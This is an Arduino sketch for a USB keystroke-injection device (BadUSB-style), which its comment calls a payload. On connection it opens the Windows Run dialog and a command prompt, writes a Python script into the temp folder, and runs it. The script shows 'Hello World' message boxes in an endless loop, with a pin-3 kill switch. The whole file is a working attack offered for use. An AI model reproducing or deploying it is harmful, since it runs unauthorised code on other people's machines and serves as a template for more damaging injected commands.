/*
 * Keep in mind this payload is made to stop it with a button in pin 3 to stop the payload to execute <3
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
    pinMode(3, INPUT_PULLUP);
    if (digitalRead(3) == LOW){
        while(1);
    }
  // Begining the Keyboard stream
  // The keyboard is set to spanish!!!
  Keyboard.begin(KeyboardLayout_es_ES);


  delay(3500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %tmp% && copy con whatToDo.py");
  
  typeKey(KEY_RETURN);

  Keyboard.print("from tkinter import messagebox");

  typeKey(KEY_RETURN);

   Keyboard.print("while True:");
  
  typeKey(KEY_RETURN);

   Keyboard.print(" messagebox.showinfo('Say Hello', 'Hello World')");
  
  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("whatToDo.py");

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  Keyboard.end();
}
void loop() {}


